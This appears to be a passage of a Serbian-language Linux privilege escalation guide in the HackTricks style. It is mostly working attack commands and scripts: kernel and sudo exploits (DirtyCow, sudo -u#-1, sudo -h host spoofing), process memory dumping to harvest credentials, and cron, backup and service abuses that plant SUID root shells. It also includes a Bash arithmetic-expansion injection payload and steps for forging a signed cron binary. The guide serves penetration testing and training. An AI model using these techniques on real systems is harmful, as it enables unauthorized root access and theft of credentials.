# Eskalacija privilegija na Linuxu

{{#include ../../../banners/hacktricks-training.md}}

## Informacije o sistemu

### Informacije o OS-u

Počnimo prikupljanjem informacija o operativnom sistemu koji je pokrenut
```bash
(cat /proc/version || uname -a ) 2>/dev/null
lsb_release -a 2>/dev/null # old, not by default on many systems
cat /etc/os-release 2>/dev/null # universal on modern systems
```
### Putanja

Ako imate **dozvole za pisanje u bilo kojoj fascikli unutar promenljive `PATH`**, možda ćete moći da preuzmete kontrolu nad nekim bibliotekama ili binarnim fajlovima:
```bash
echo $PATH
```
### Informacije o okruženju

Zanimljive informacije, lozinke ili API ključevi u promenljivama okruženja?
```bash
(env || set) 2>/dev/null
```
### Kernel exploits

Proverite verziju kernela i da li postoji neki exploit koji može da se iskoristi za eskalaciju privilegija
```bash
cat /proc/version
uname -a
searchsploit "Linux Kernel"
```
Možete pronaći dobru listu ranjivih verzija kernela i neke već **compiled exploits** ovde: [https://github.com/lucyoa/kernel-exploits](https://github.com/lucyoa/kernel-exploits) i [exploitdb sploits](https://gitlab.com/exploit-database/exploitdb-bin-sploits).\
Druge stranice na kojima možete pronaći neke **compiled exploits**: [https://github.com/bwbwbwbw/linux-exploit-binaries](https://github.com/bwbwbwbw/linux-exploit-binaries), [https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack](https://github.com/Kabot/Unix-Privilege-Escalation-Exploits-Pack)

Da biste izdvojili sve ranjive verzije kernela sa tog web mesta, možete koristiti:
```bash
curl https://raw.githubusercontent.com/lucyoa/kernel-exploits/master/README.md 2>/dev/null | grep "Kernels: " | cut -d ":" -f 2 | cut -d "<" -f 1 | tr -d "," | tr ' ' '\n' | grep -v "^\d\.\d$" | sort -u -r | tr '\n' ' '
```
Alati koji mogu pomoći u pretrazi kernel exploita su:

[linux-exploit-suggester.sh](https://github.com/mzet-/linux-exploit-suggester)\
[linux-exploit-suggester2.pl](https://github.com/jondonas/linux-exploit-suggester-2)\
[linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py) (izvršite IN victim,samo proverava exploite za kernel 2.x)

Uvek **pretražite verziju kernela na Google-u**, možda je vaša verzija kernela navedena u nekom kernel exploitu i tada ćete biti sigurni da je taj exploit validan.

Dodatne tehnike eksploatacije kernela:

{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/adreno-a7xx-sds-rb-priv-bypass-gpu-smmu-kernel-rw.md
{{#endref}}
{{#ref}}
../../../binary-exploitation/linux-kernel-exploitation/arm64-static-linear-map-kaslr-bypass.md
{{#endref}}

### CVE-2016-5195 (DirtyCow)

Eskalacija privilegija na Linuxu - Linux Kernel <= 3.19.0-73.8
```bash
# make dirtycow stable
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
g++ -Wall -pedantic -O2 -std=c++11 -pthread -o dcow 40847.cpp -lutil
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
```
### Sudo verzija

Na osnovu ranjivih sudo verzija koje se pojavljuju u:
```bash
searchsploit sudo
```
Možete proveriti da li je verzija sudo ranjiva koristeći ovaj grep.
```bash
sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]"
```
### Sudo < 1.9.17p1

Sudo verzije pre 1.9.17p1 (**1.9.14 - 1.9.17 < 1.9.17p1**) omogućavaju lokalnim korisnicima bez privilegija da eskaliraju svoje privilegije na root putem sudo opcije `--chroot` kada se `/etc/nsswitch.conf` datoteka koristi iz direktorijuma kojim upravlja korisnik.

Ovde je [PoC](https://github.com/pr0v3rbs/CVE-2025-32463_chwoot) za exploit ove [ranjivosti](https://nvd.nist.gov/vuln/detail/CVE-2025-32463). Pre pokretanja exploita proverite da li je vaša `sudo` verzija ranjiva i da li podržava `chroot` funkcionalnost.

Za više informacija pogledajte originalni [savet o ranjivosti](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)

### Sudo bypass pravila zasnovanih na hostu (CVE-2025-32462)

Sudo pre verzije 1.9.17p1 (prijavljeni pogođeni opseg: **1.8.8–1.9.17**) može da proceni sudoers pravila zasnovana na hostu koristeći **hostname koji je uneo korisnik** iz `sudo -h <host>` umesto **stvarnog hostname-a**. Ako sudoers dodeljuje šire privilegije na drugom hostu, taj host možete lokalno **spoofovati**.

Zahtevi:
- Ranjiva sudo verzija
- Sudoers pravila specifična za host (host nije ni trenutni hostname ni `ALL`)

Primer sudoers obrasca:
```
Host_Alias     SERVERS = devbox, prodbox
Host_Alias     PROD    = prodbox
alice          SERVERS, !PROD = NOPASSWD:ALL
```
Exploit lažiranjem dozvoljenog hosta:
```bash
sudo -h devbox id
sudo -h devbox -i
```
Ako se rezolucija spoofovanog imena blokira, dodajte ga u `/etc/hosts` ili koristite hostname koji se već pojavljuje u logs/configs da biste izbegli DNS lookups.

#### sudo < v1.8.28

Od @sickrov
```
sudo -u#-1 /bin/bash
```
### Dmesg verifikacija potpisa nije uspela

Pogledajte **Smasher2 box na HTB-u** za **primer** kako se ova ranjivost može iskoristiti
```bash
dmesg 2>/dev/null | grep "signature"
```
### Dodatna enumeracija sistema
```bash
date 2>/dev/null #Date
(df -h || lsblk) #System stats
lscpu #CPU info
lpstat -a 2>/dev/null #Printers info
```
## Nabrojite moguće odbrane

### AppArmor
```bash
if [ `which aa-status 2>/dev/null` ]; then
aa-status
elif [ `which apparmor_status 2>/dev/null` ]; then
apparmor_status
elif [ `ls -d /etc/apparmor* 2>/dev/null` ]; then
ls -d /etc/apparmor*
else
echo "Not found AppArmor"
fi
```
### Grsecurity
```bash
((uname -r | grep "\-grsec" >/dev/null 2>&1 || grep "grsecurity" /etc/sysctl.conf >/dev/null 2>&1) && echo "Yes" || echo "Not found grsecurity")
```
### PaX
```bash
(which paxctl-ng paxctl >/dev/null 2>&1 && echo "Yes" || echo "Not found PaX")
```
### Execshield
```bash
(grep "exec-shield" /etc/sysctl.conf || echo "Not found Execshield")
```
### SElinux
```bash
(sestatus 2>/dev/null || echo "Not found sestatus")
```
### ASLR
```bash
cat /proc/sys/kernel/randomize_va_space 2>/dev/null
#If 0, not enabled
```
## Izlazak iz kontejnera

Ako se nalazite unutar kontejnera, počnite od sledećeg odeljka o container-security, a zatim pređite na stranice za abuse specifične za runtime:


{{#ref}}
../../containers-namespaces/container-security/
{{#endref}}

## Diskovi

Proverite **šta je montirano, a šta odmontirano**, gde i zašto. Ako je nešto odmontirano, možete pokušati da ga montirate i proverite da li sadrži privatne informacije.
```bash
ls /dev 2>/dev/null | grep -i "sd"
cat /etc/fstab 2>/dev/null | grep -v "^#" | grep -Pv "\W*\#" 2>/dev/null
#Check if credentials in fstab
grep -E "(user|username|login|pass|password|pw|credentials)[=:]" /etc/fstab /etc/mtab 2>/dev/null
```
## Korisni programi

Nabrojte korisne binarne datoteke
```bash
which nmap aws nc ncat netcat nc.traditional wget curl ping gcc g++ make gdb base64 socat python python2 python3 python2.7 python2.6 python3.6 python3.7 perl php ruby xterm doas sudo fetch docker lxc ctr runc rkt kubectl 2>/dev/null
```
Takođe, proverite da li je **instaliran bilo koji kompajler**. Ovo je korisno ako treba da upotrebite neki kernel exploit, jer se preporučuje da ga kompajlirate na mašini na kojoj ćete ga koristiti (ili na nekoj sličnoj).
```bash
(dpkg --list 2>/dev/null | grep "compiler" | grep -v "decompiler\|lib" 2>/dev/null || yum list installed 'gcc*' 2>/dev/null | grep gcc 2>/dev/null; which gcc g++ 2>/dev/null || locate -r "/gcc[0-9\.-]\+$" 2>/dev/null | grep -v "/doc/")
```
### Instalirani ranjivi softver

Proverite **verzije instaliranih paketa i servisa**. Možda postoji neka stara verzija Nagiosa (na primer) koja bi mogla da se iskoristi za escalation privilegija…\
Preporučuje se da ručno proverite verziju sumnjivijeg instaliranog softvera.
```bash
dpkg -l #Debian
rpm -qa #Centos
```
Ako imate SSH pristup mašini, takođe možete koristiti **openVAS** da proverite da li je softver instaliran unutar mašine zastareo i ranjiv.

> [!NOTE] > _Imajte na umu da će ove komande prikazati mnogo informacija koje će uglavnom biti beskorisne, zato se preporučuje korišćenje aplikacija kao što je OpenVAS ili sličnih aplikacija koje će proveriti da li je neka instalirana verzija softvera ranjiva na poznate exploit-e_

## Procesi

Pogledajte **koji procesi** se izvršavaju i proverite da li neki proces ima **više privilegija nego što bi trebalo** (možda se tomcat izvršava kao root?)
```bash
ps aux
ps -ef
top -n 1
```
Uvek proverite da li su pokrenuti [**electron/cef/chromium debuggers**], jer biste mogli da ih zloupotrebite za eskalaciju privilegija](../../software-information/electron-cef-chromium-debugger-abuse.md). **Linpeas** ih detektuje proverom parametra `--inspect` unutar komandne linije procesa.\
Takođe **proverite svoje privilegije nad binarnim fajlovima procesa**, možda možete da prepišete neki od njih.

### Lanci roditelj–dete između korisnika

Child proces koji se izvršava pod **drugim korisnikom** od svog parent procesa nije automatski zlonameran, ali predstavlja koristan **signal za trijažu**. Neki prelazi su očekivani (`root` pokreće service korisnika, login managers kreiraju session procese), ali neuobičajeni lanci mogu otkriti wrappers, debug helpers, persistence ili slabe granice poverenja u runtime okruženju.

Brza provera:
```bash
ps -eo pid,ppid,user,comm,args --sort=ppid
pstree -alp
```
Ako pronađete iznenađujući lanac, pregledajte komandnu liniju roditeljskog procesa i sve datoteke koje utiču na njegovo ponašanje (`config`, `EnvironmentFile`, pomoćne skripte, radni direktorijum i argumente sa dozvolom upisa). U nekoliko stvarnih privesc putanja, sam child proces nije bio upisiv, ali su **config kojim upravlja parent proces** ili lanac pomoćnih skripti bili upisivi.

### Izvršne datoteke obrisane nakon pokretanja i obrisane datoteke otvorene u procesu

Runtime artefakti često ostaju dostupni **i nakon brisanja**. Ovo je korisno i za privilege escalation i za oporavak dokaza iz procesa koji već ima otvorene osetljive datoteke.

Proverite obrisane izvršne datoteke:
```bash
pid=<PID>
ls -l /proc/$pid/exe
readlink /proc/$pid/exe
tr '\0' ' ' </proc/$pid/cmdline; echo
```
Ako `/proc/<PID>/exe` pokazuje na `(deleted)`, proces i dalje pokreće staru binarnu sliku iz memorije. To je snažan signal za istragu zato što:

- uklonjeni executable možda sadrži zanimljive stringove ili kredencijale
- pokrenuti proces možda i dalje izlaže korisne deskriptore fajlova
- obrisani privilegovani binary može ukazivati na nedavne neovlašćene izmene ili pokušaj čišćenja

Globalno prikupite obrisane-otvorene fajlove:
```bash
lsof +L1
```
Ako pronađete zanimljiv deskriptor, preuzmite ga direktno:
```bash
ls -l /proc/<PID>/fd
cat /proc/<PID>/fd/<FD>
```
Ovo je naročito korisno kada proces i dalje ima otvoren obrisani secret, skriptu, export baze podataka ili flag fajl.

### Monitoring procesa

Možete koristiti alate kao što je [**pspy**](https://github.com/DominicBreuker/pspy) za monitoring procesa. Ovo može biti veoma korisno za identifikovanje ranjivih procesa koji se često izvršavaju ili kada je ispunjen određeni skup zahteva.

### Memorija procesa

Neki servisi servera čuvaju **credentials u čistom tekstu unutar memorije**.\
Obično su vam potrebne **root privilegije** za čitanje memorije procesa koji pripadaju drugim korisnicima, pa je ovo obično korisnije kada ste već root i želite da otkrijete još credentials.\
Međutim, imajte na umu da **kao običan korisnik možete čitati memoriju procesa koje posedujete**.

> [!WARNING]
> Imajte na umu da većina računara danas **podrazumevano ne dozvoljava ptrace**, što znači da ne možete dump-ovati druge procese koji pripadaju vašem neprivilegovanom korisniku.
>
> Fajl _**/proc/sys/kernel/yama/ptrace_scope**_ kontroliše dostupnost ptrace-a:
>
> - **kernel.yama.ptrace_scope = 0**: svi procesi mogu da se debug-uju, pod uslovom da imaju isti uid. Ovo je klasičan način na koji je ptracing funkcionisao.
> - **kernel.yama.ptrace_scope = 1**: samo parent proces može da se debug-uje.
> - **kernel.yama.ptrace_scope = 2**: samo admin može da koristi ptrace, jer je potrebna CAP_SYS_PTRACE capability.
> - **kernel.yama.ptrace_scope = 3**: nijedan proces ne može da se prati pomoću ptrace-a. Kada se jednom podesi, potrebno je restartovanje sistema da bi se ptracing ponovo omogućio.

#### GDB

Ako imate pristup memoriji FTP servisa (na primer), mogli biste da preuzmete Heap i u njemu pretražite credentials.
```bash
gdb -p <FTP_PROCESS_PID>
(gdb) info proc mappings
(gdb) q
(gdb) dump memory /tmp/mem_ftp <START_HEAD> <END_HEAD>
(gdb) q
strings /tmp/mem_ftp #User and password
```
#### GDB Script
```bash:dump-memory.sh
#!/bin/bash
#./dump-memory.sh <PID>
grep rw-p /proc/$1/maps \
| sed -n 's/^\([0-9a-f]*\)-\([0-9a-f]*\) .*$/\1 \2/p' \
| while read start stop; do \
gdb --batch --pid $1 -ex \
"dump memory $1-$start-$stop.dump 0x$start 0x$stop"; \
done
```
#### /proc/$pid/maps & /proc/$pid/mem

Za dati ID procesa, **maps prikazuje kako je memorija mapirana unutar virtuelnog adresnog prostora tog procesa**; takođe prikazuje **dozvole svake mapirane oblasti**. Pseudo-datoteka **mem izlaže samu memoriju procesa**. Iz **maps** datoteke saznajemo koje su **memorijske oblasti čitljive** i njihove offsete. Ove informacije koristimo da **pozicioniramo pokazivač u mem datoteci i izbacimo sve čitljive oblasti** u datoteku.
```bash
procdump()
(
cat /proc/$1/maps | grep -Fv ".so" | grep " 0 " | awk '{print $1}' | ( IFS="-"
while read a b; do
dd if=/proc/$1/mem bs=$( getconf PAGESIZE ) iflag=skip_bytes,count_bytes \
skip=$(( 0x$a )) count=$(( 0x$b - 0x$a )) of="$1_mem_$a.bin"
done )
cat $1*.bin > $1.dump
rm $1*.bin
)
```
#### /dev/mem

`/dev/mem` omogućava pristup **fizičkoj** memoriji sistema, a ne virtuelnoj memoriji. Virtuelnom adresnom prostoru kernela može se pristupiti pomoću /dev/kmem.\
Obično, `/dev/mem` mogu da čitaju samo **root** i grupa **kmem**.
```
strings /dev/mem -n10 | grep -i PASS
```
### ProcDump za Linux

ProcDump je Linux verzija klasičnog alata ProcDump iz paketa Sysinternals alata za Windows. Preuzmite ga sa [https://github.com/Sysinternals/ProcDump-for-Linux](https://github.com/Sysinternals/ProcDump-for-Linux)
```
procdump -p 1714

ProcDump v1.2 - Sysinternals process dump utility
Copyright (C) 2020 Microsoft Corporation. All rights reserved. Licensed under the MIT license.
Mark Russinovich, Mario Hewardt, John Salem, Javid Habibi
Monitors a process and writes a dump file when the process meets the
specified criteria.

Process:		sleep (1714)
CPU Threshold:		n/a
Commit Threshold:	n/a
Thread Threshold:		n/a
File descriptor Threshold:		n/a
Signal:		n/a
Polling interval (ms):	1000
Threshold (s):	10
Number of Dumps:	1
Output directory for core dumps:	.

Press Ctrl-C to end monitoring without terminating the process.

[20:20:58 - WARN]: Procdump not running with elevated credentials. If your uid does not match the uid of the target process procdump will not be able to capture memory dumps
[20:20:58 - INFO]: Timed:
[20:21:00 - INFO]: Core dump 0 generated: ./sleep_time_2021-11-03_20:20:58.1714
```
### Alati

Za preuzimanje memorije procesa možete koristiti:

- [**https://github.com/Sysinternals/ProcDump-for-Linux**](https://github.com/Sysinternals/ProcDump-for-Linux)
- [**https://github.com/hajzer/bash-memory-dump**](https://github.com/hajzer/bash-memory-dump) (root) - \_Možete ručno ukloniti zahteve za root i preuzeti memoriju procesa čiji ste vlasnik
- Skripta A.5 iz [**https://www.delaat.net/rp/2016-2017/p97/report.pdf**](https://www.delaat.net/rp/2016-2017/p97/report.pdf) (potreban je root)

### Akreditivi iz memorije procesa

#### Ručni primer

Ako utvrdite da je proces za autentifikaciju pokrenut:
```bash
ps -ef | grep "authenticator"
root      2027  2025  0 11:46 ?        00:00:00 authenticator
```
Možete napraviti dump procesa (pogledajte prethodne odeljke da biste pronašli različite načine za dump memorije procesa) i pretražiti memoriju u potrazi za credentialima:
```bash
./dump-memory.sh 2027
strings *.dump | grep -i password
```
#### mimipenguin

Alat [**https://github.com/huntergregal/mimipenguin**](https://github.com/huntergregal/mimipenguin) će **ukrasti kredencijale u čistom tekstu iz memorije** i iz nekih **dobro poznatih datoteka**. Za pravilan rad zahteva root privilegije.

| Funkcija                                           | Naziv procesa         |
| ------------------------------------------------- | -------------------- |
| GDM lozinka (Kali Desktop, Debian Desktop)       | gdm-password         |
| Gnome Keyring (Ubuntu Desktop, ArchLinux Desktop) | gnome-keyring-daemon |
| LightDM (Ubuntu Desktop)                          | lightdm              |
| VSFTPd (aktivne FTP veze)                         | vsftpd               |
| Apache2 (aktivne HTTP Basic Auth sesije)          | apache2              |
| OpenSSH (aktivne SSH sesije - korišćenje Sudo-a)  | sshd:                |

#### Regex pretrage/[truffleproc](https://github.com/controlplaneio/truffleproc)
```bash
# un truffleproc.sh against your current Bash shell (e.g. $$)
./truffleproc.sh $$
# coredumping pid 6174
Reading symbols from od...
Reading symbols from /usr/lib/systemd/systemd...
Reading symbols from /lib/systemd/libsystemd-shared-247.so...
Reading symbols from /lib/x86_64-linux-gnu/librt.so.1...
[...]
# extracting strings to /tmp/tmp.o6HV0Pl3fe
# finding secrets
# results in /tmp/tmp.o6HV0Pl3fe/results.txt
```
## Zakazani/Cron poslovi

### Crontab UI (alseambusher) koji radi kao root – privesc web-baziranog scheduler-a

Ako web panel „Crontab UI“ (alseambusher/crontab-ui) radi kao root i vezan je samo za loopback, i dalje mu možete pristupiti putem SSH local port-forwarding-a i kreirati privilegovani job za eskalaciju privilegija.

Tipičan lanac
- Otkrijte port dostupan samo preko loopback-a (npr. 127.0.0.1:8000) i Basic-Auth realm pomoću `ss -ntlp` / `curl -v localhost:8000`
- Pronađite kredencijale u operativnim artefaktima:
- Backup-ovima/skriptama sa `zip -P <password>`
- systemd unit-u koji izlaže `Environment="BASIC_AUTH_USER=..."`, `Environment="BASIC_AUTH_PWD=..."`
- Uspostavite tunel i prijavite se:
```bash
ssh -L 9001:localhost:8000 user@target
# browse http://localhost:9001 and authenticate
```
- Kreiraj posao sa visokim privilegijama i pokreni ga odmah (daje SUID shell):
```bash
# Name: escalate
# Command:
cp /bin/bash /tmp/rootshell && chmod 6777 /tmp/rootshell
```
- Koristite ga:
```bash
/tmp/rootshell -p   # root shell
```
Hardening
- Nemoj pokretati Crontab UI kao root; ograniči ga pomoću namenski kreiranog korisnika i minimalnih dozvola
- Poveži ga na localhost i dodatno ograniči pristup pomoću firewall-a/VPN-a; nemoj ponovo koristiti lozinke
- Izbegavaj ugrađivanje secrets u unit files; koristi stores za secrets ili EnvironmentFile dostupan samo root korisniku
- Omogući audit/logging za izvršavanja job-ova na zahtev



Proveri da li je neki scheduled job ranjiv. Možda možeš da iskoristiš script koji se izvršava kao root (wildcard vuln? možeš li da izmeniš files koje root koristi? koristiš symlinks? kreiraš određene files u directory-ju koji root koristi?).
```bash
crontab -l
ls -al /etc/cron* /etc/at*
cat /etc/cron* /etc/at* /etc/anacrontab /var/spool/cron/crontabs/root 2>/dev/null | grep -v "^#"
```
Ako se koristi `run-parts`, proverite koja imena će se zaista izvršiti:
```bash
run-parts --test /etc/cron.hourly
run-parts --test /etc/cron.daily
```
Ovo izbegava false positives. Direktorijum periodičnog izvršavanja sa dozvolom upisivanja koristan je samo ako se naziv vašeg payload fajla podudara sa lokalnim pravilima za `run-parts`.

### Cron putanja

Na primer, unutar _/etc/crontab_ možete pronaći PATH: _PATH=**/home/user**:/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin_

(_Obratite pažnju na to da korisnik „user“ ima dozvole za upisivanje u /home/user_)

Ako unutar ovog crontab-a root korisnik pokuša da izvrši neku komandu ili skriptu bez postavljanja putanje. Na primer: _\* \* \* \* root overwrite.sh_\
Tada možete dobiti root shell koristeći:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > /home/user/overwrite.sh
#Wait cron job to be executed
/tmp/bash -p #The effective uid and gid to be set to the real uid and gid
```
### Cron koji koristi skriptu sa džoker znakom (Wildcard Injection)

Ako skriptu izvršava root i ona u komandi sadrži „**\***“, ovo možete iskoristiti za izvršavanje neočekivanih radnji (kao što je privesc). Primer:
```bash
rsync -a *.sh rsync://host.back/src/rbd #You can create a file called "-e sh myscript.sh" so the script will execute our script
```
**Ako je wildcard ispred putanje kao što je** _**/some/path/\***_ **, nije ranjivo (čak ni** _**./\***_ **nije).**

Pročitajte sledeću stranicu za još trikova za exploitation wildcard-a:


{{#ref}}
../../interesting-files-permissions/wildcards-spare-tricks.md
{{#endref}}


### Ubrizgavanje kroz Bash aritmetičku ekspanziju u cron parserima logova

Bash obavlja proširivanje parametara i zamenu komandi pre aritmetičke evaluacije u ((...)), $((...)) i let. Ako root cron/parser čita nepouzdana polja loga i prosleđuje ih u aritmetički kontekst, attacker može da ubaci zamenu komande $(...), koja se izvršava kao root kada se cron pokrene.

- Zašto funkcioniše: U Bash-u, ekspanzije se obavljaju sledećim redosledom: proširivanje parametara/varijabli, zamena komandi, aritmetička ekspanzija, a zatim razdvajanje reči i proširivanje putanja. Zato se vrednost poput `$(/bin/bash -c 'id > /tmp/pwn')0` prvo zameni (čime se komanda izvršava), a preostala numerička vrednost `0` koristi se za aritmetiku, tako da se skripta nastavlja bez grešaka.

- Tipičan ranjivi obrazac:
```bash
#!/bin/bash
# Example: parse a log and "sum" a count field coming from the log
while IFS=',' read -r ts user count rest; do
# count is untrusted if the log is attacker-controlled
(( total += count ))     # or: let "n=$count"
done < /var/www/app/log/application.log
```

- Exploitation: Upišite tekst pod kontrolom attackera u parsirani log tako da polje koje izgleda kao broj sadrži zamenu komande i završava se cifrom. Obezbedite da vaša komanda ne ispisuje ništa na stdout (ili preusmerite taj izlaz) kako bi aritmetika ostala validna.
```bash
# Injected field value inside the log (e.g., via a crafted HTTP request that the app logs verbatim):
$(/bin/bash -c 'cp /bin/bash /tmp/sh; chmod +s /tmp/sh')0
# When the root cron parser evaluates (( total += count )), your command runs as root.
```

### Prepisivanje cron skripte i symlink

Ako **možete da izmenite cron skriptu koju izvršava root**, vrlo lako možete dobiti shell:
```bash
echo 'cp /bin/bash /tmp/bash; chmod +s /tmp/bash' > </PATH/CRON/SCRIPT>
#Wait until it is executed
/tmp/bash -p
```
Ako skripta koju izvršava root koristi **direktorijum kojem imate potpun pristup**, možda bi bilo korisno obrisati taj folder i **kreirati symlink folder ka drugom folderu** koji sadrži skriptu pod vašom kontrolom.
```bash
ln -d -s </PATH/TO/POINT> </PATH/CREATE/FOLDER>
```
### Validacija symlink-ova i bezbednije rukovanje datotekama

Prilikom pregleda privilegovanih skripti/binarnih datoteka koje čitaju ili upisuju datoteke na osnovu putanje, proverite kako se obrađuju linkovi:

- `stat()` prati symlink i vraća metapodatke cilja.
- `lstat()` vraća metapodatke samog linka.
- `readlink -f` i `namei -l` pomažu da se razreši krajnji cilj i prikažu dozvole svake komponente putanje.
```bash
readlink -f /path/to/link
namei -l /path/to/link
```
Za defenders/developers, bezbedniji obrasci protiv symlink trikova uključuju:

- `O_EXCL` sa `O_CREAT`: neuspeh ako putanja već postoji (blokira linkove/fajlove koje je attacker unapred kreirao).
- `openat()`: rad relativno u odnosu na trusted directory file descriptor.
- `mkstemp()`: atomsko kreiranje privremenih fajlova sa secure permissions.

### Custom-signed cron binaries sa writable payloads

Blue teams ponekad „potpisuju” cron-driven binaries tako što izdvoje prilagođenu ELF sekciju i pretraže je pomoću `grep`-a u potrazi za vendor stringom pre nego što ih izvrše kao root. Ako je taj binary writable za grupu (npr. `/opt/AV/periodic-checks/monitor`, u vlasništvu `root:devs 770`) i možete da leak-ujete signing material, možete da falsifikujete sekciju i preuzmete cron task:

1. Koristite `pspy` da uhvatite verification flow. U Era-i je root pokrenuo `objcopy --dump-section .text_sig=text_sig_section.bin monitor`, zatim `grep -oP '(?<=UTF8STRING        :)Era Inc.' text_sig_section.bin`, a potom izvršio fajl.
2. Ponovo kreirajte očekivani certificate pomoću leak-ovanog key/config fajla (iz `signing.zip`):
```bash
openssl req -x509 -new -nodes -key key.pem -config x509.genkey -days 365 -out cert.pem
```
3. Napravite malicious replacement (npr. ubacite SUID bash, dodajte svoj SSH key) i ugradite certificate u `.text_sig` tako da `grep` prođe:
```bash
gcc -fPIC -pie monitor.c -o monitor
objcopy --add-section .text_sig=cert.pem monitor
objcopy --dump-section .text_sig=text_sig_section.bin monitor
strings text_sig_section.bin | grep 'Era Inc.'
```
4. Prepišite scheduled binary uz očuvanje execute bits:
```bash
cp monitor /opt/AV/periodic-checks/monitor
chmod 770 /opt/AV/periodic-checks/monitor
```
5. Sačekajte sledeće cron pokretanje; kada naivna signature provera uspe, vaš payload će se izvršiti kao root.

### Frequent cron jobs

Možete nadgledati procese da biste pronašli procese koji se izvršavaju svakog 1, 2 ili 5 minuta. Možda to možete da iskoristite za escalation privileges.

Na primer, da biste **nadgledali na svakih 0.1 s tokom 1 minuta**, **sortirali po najmanje izvršavanim command-ima** i obrisali command-e koji su izvršeni najviše puta, možete da uradite:
```bash
for i in $(seq 1 610); do ps -e --format cmd >> /tmp/monprocs.tmp; sleep 0.1; done; sort /tmp/monprocs.tmp | uniq -c | grep -v "\[" | sed '/^.\{200\}./d' | sort | grep -E -v "\s*[6-9][0-9][0-9]|\s*[0-9][0-9][0-9][0-9]"; rm /tmp/monprocs.tmp;
```
**Takođe možete koristiti** [**pspy**](https://github.com/DominicBreuker/pspy/releases) (ovo će pratiti i izlistati svaki proces koji se pokrene).

### Root backup kopije koje čuvaju mode bitove koje je postavio napadač (pg_basebackup)

Ako cron u vlasništvu root-a pokreće `pg_basebackup` (ili bilo koje rekurzivno kopiranje) nad direktorijumom baze podataka u koji možete da pišete, možete postaviti **SUID/SGID binary** koji će biti ponovo kopiran kao **root:root**, sa istim mode bitovima, u izlazni direktorijum backup kopije.

Tipičan tok otkrivanja (kao DB user sa malim privilegijama):
- Koristite `pspy` da uočite root cron koji poziva nešto poput `/usr/lib/postgresql/14/bin/pg_basebackup -h /var/run/postgresql -U postgres -D /opt/backups/current/` svakog minuta.
- Potvrdite da je izvorni cluster (npr. `/var/lib/postgresql/14/main`) upisiv za vas i da odredište (`/opt/backups/current`) nakon izvršavanja job-a postaje u vlasništvu root-a.

Exploit:
```bash
# As the DB service user owning the cluster directory
cd /var/lib/postgresql/14/main
cp /bin/bash .
chmod 6777 bash

# Wait for the next root backup run (pg_basebackup preserves permissions)
ls -l /opt/backups/current/bash  # expect -rwsrwsrwx 1 root root ... bash
/opt/backups/current/bash -p    # root shell without dropping privileges
```
Ovo funkcioniše zato što `pg_basebackup` čuva bitove dozvola za fajlove prilikom kopiranja klastera; kada ga pokrene root, odredišni fajlovi nasleđuju **root vlasništvo + SUID/SGID koje je odabrao napadač**. Svaka slična privilegovana rutina za backup/kopiranje koja zadržava dozvole i upisuje podatke na izvršivu lokaciju podložna je napadu.

### Nevidljivi cron poslovi

Moguće je kreirati cronjob **postavljanjem carriage return znaka nakon komentara** (bez znaka za novi red), a cron job će raditi. Primer (obratite pažnju na carriage return znak):
```bash
#This is a comment inside a cron config file\r* * * * * echo "Surprise!"
```
Da biste otkrili ovu vrstu prikrivenog unosa, pregledajte cron datoteke pomoću alata koji prikazuju kontrolne znakove:
```bash
cat -A /etc/crontab
cat -A /etc/cron.d/*
sed -n 'l' /etc/crontab /etc/cron.d/* 2>/dev/null
xxd /etc/crontab | head
```
## Servisi

### Writable _.service_ files

Proverite da li možete da upisujete u neki `.service` fajl; ako možete, **mogli biste da ga izmenite** tako da **izvršava** vaš **backdoor kada** se servis **pokrene**, **restartuje** ili **zaustavi** (možda ćete morati da sačekate da se mašina restartuje).\
Na primer, kreirajte svoj backdoor unutar .service fajla pomoću **`ExecStart=/tmp/script.sh`**

### Writable service binaries

Imajte na umu da, ako imate **write permissions nad binarnim fajlovima koje servisi izvršavaju**, možete da ih izmenite i ubacite backdoor, tako da se backdoor izvrši kada se servisi ponovo pokrenu.

### systemd PATH - Relative Paths

PATH koji koristi **systemd** možete videti pomoću:
```bash
systemctl show-environment
```
Ako utvrdite da možete da **pišete** u bilo koju fasciklu na putanji, možda ćete moći da **eskalirate privilegije**. Potrebno je da potražite **relativne putanje koje se koriste u konfiguracionim** fajlovima servisa, kao što su:
```bash
ExecStart=faraday-server
ExecStart=/bin/sh -ec 'ifup --allow=hotplug %I; ifquery --state %I'
ExecStop=/bin/sh "uptux-vuln-bin3 -stuff -hello"
```
Zatim napravite **izvršni fajl** sa **istim imenom kao binarni fajl relativne putanje** unutar systemd PATH foldera u koji možete da upisujete, a kada se od servisa zatraži izvršavanje ranjive radnje (**Start**, **Stop**, **Reload**), vaš **backdoor će biti izvršen** (korisnici bez privilegija obično ne mogu da pokreću/zaustavljaju servise, ali proverite da li možete da koristite `sudo -l`).

**Saznajte više o servisima pomoću `man systemd.service`.**

## **Tajmeri**

**Tajmeri** su systemd unit fajlovi čiji se naziv završava sa `**.timer**` i koji kontrolišu `**.service**` fajlove ili događaje. **Tajmeri** se mogu koristiti kao alternativa za cron, jer imaju ugrađenu podršku za kalendarske i monotone vremenske događaje i mogu se pokretati asinhrono.

Sve tajmere možete izlistati pomoću:
```bash
systemctl list-timers --all
```
### Timer-i sa dozvolom upisa

Ako možete da izmenite timer, možete učiniti da izvršava neke postojeće jedinice systemd.unit (kao što su `.service` ili `.target`).
```bash
Unit=backdoor.service
```
U dokumentaciji možete pročitati šta je Unit:

> Unit koji će biti aktiviran kada ovaj timer istekne. Argument je naziv unit-a, čiji sufiks nije ".timer". Ako nije naveden, ova vrednost podrazumevano predstavlja service koji ima isto ime kao timer unit, izuzimajući sufiks. (Pogledajte iznad.) Preporučuje se da naziv aktiviranog unit-a i naziv timer unit-a budu identični, izuzimajući sufiks.

Da biste zloupotrebili ovu dozvolu, potrebno je da:

- Pronađete neki systemd unit (kao što je `.service`) koji **izvršava writable binary**
